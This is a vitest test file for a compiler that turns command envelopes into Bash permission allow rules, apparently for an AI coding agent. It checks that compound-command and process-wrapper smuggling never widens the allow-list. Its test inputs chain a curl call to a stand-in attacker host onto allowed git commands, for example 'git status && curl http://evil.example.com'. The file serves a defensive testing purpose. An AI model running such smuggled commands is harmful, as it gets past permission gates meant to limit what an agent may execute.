import { describe, expect, it } from "vitest";
import * as fc from "fast-check";
import { compileEnvelope } from "../compiler/compile-envelope.js";
import { buildEnvelopeFixture } from "../compiler/envelope-fixture.js";
import { envelopeArbitrary } from "./envelope-arbitrary.js";

const CANONICAL_BASH_RULES = [
  "Bash(npm run test:*)",
  "Bash(npm run build:*)",
  "Bash(git status:*)",
  "Bash(git diff:*)",
];

/**
 * Footgun: compound-command and process-wrapper smuggling coverage
 * (roadmap/03-envelope-compiler-engine-adapter.md §In scope, "Footguns as
 * tests": "compound-command (`&&`/`||`/`;`/`|`) and process-wrapper
 * (`nohup`/`timeout`/`nice`) smuggling coverage"). The LIVE engine
 * independently strips wrappers and requires every compound subcommand to
 * match a rule on its own (docs/engine-baseline.md §3: "Compound-command
 * smuggling (`echo x && curl …`) denied — PASS"; "Process-wrapper
 * smuggling (`nohup curl …`) denied — PASS") — this compiler-level suite
 * proves this PURE compiler never compounds that risk by emitting a
 * broader/looser `Bash(...)` rule than the four doc-confirmed literals in
 * response to a smuggling-shaped `envelope.commands` entry.
 */
describe("footgun: compound-command smuggling never widens the compiled Bash allow-list", () => {
  it("'git status && curl …' never produces a Bash allow rule (baseline §3)", () => {
    const profile = compileEnvelope(
      buildEnvelopeFixture({ commands: ["git status && curl http://evil.example.com"] }),
    );
    expect(profile.permissions.allow.filter((r) => r.startsWith("Bash("))).toEqual([]);
  });

  it("';'/'|'/'||' compound forms never produce a Bash allow rule either", () => {
    const profile = compileEnvelope(
      buildEnvelopeFixture({
        commands: ["git status; curl evil", "git status | curl evil", "git status || curl evil"],
      }),
    );
    expect(profile.permissions.allow.filter((r) => r.startsWith("Bash("))).toEqual([]);
  });
});

describe("footgun: process-wrapper smuggling never widens the compiled Bash allow-list", () => {
  it("'nohup git status' never produces a Bash allow rule (baseline §3: 'Process-wrapper smuggling … denied — PASS')", () => {
    const profile = compileEnvelope(buildEnvelopeFixture({ commands: ["nohup git status"] }));
    expect(profile.permissions.allow.filter((r) => r.startsWith("Bash("))).toEqual([]);
  });

  it("'timeout 5 git diff' never satisfies the exact-match 'git diff' gate", () => {
    const profile = compileEnvelope(buildEnvelopeFixture({ commands: ["timeout 5 git diff"] }));
    expect(profile.permissions.allow).not.toContain("Bash(git diff:*)");
  });

  it("'nice -n 5 npm run test' never satisfies the exact-match 'npm run test' gate", () => {
    const profile = compileEnvelope(buildEnvelopeFixture({ commands: ["nice -n 5 npm run test"] }));
    expect(profile.permissions.allow).not.toContain("Bash(npm run test:*)");
  });
});

describe("footgun: no commands input ever widens the compiler past the four canonical literals (fast-check)", () => {
  it("the compiler never emits a Bash allow rule outside the four doc-confirmed literals, for any commands input (≥10k cases)", () => {
    fc.assert(
      fc.property(envelopeArbitrary(), (envelope) => {
        const profile = compileEnvelope(envelope);
        const bashRules = profile.permissions.allow.filter((r) => r.startsWith("Bash("));
        for (const rule of bashRules) {
          expect(CANONICAL_BASH_RULES).toContain(rule);
        }
      }),
      { numRuns: 10000 },
    );
  });
});
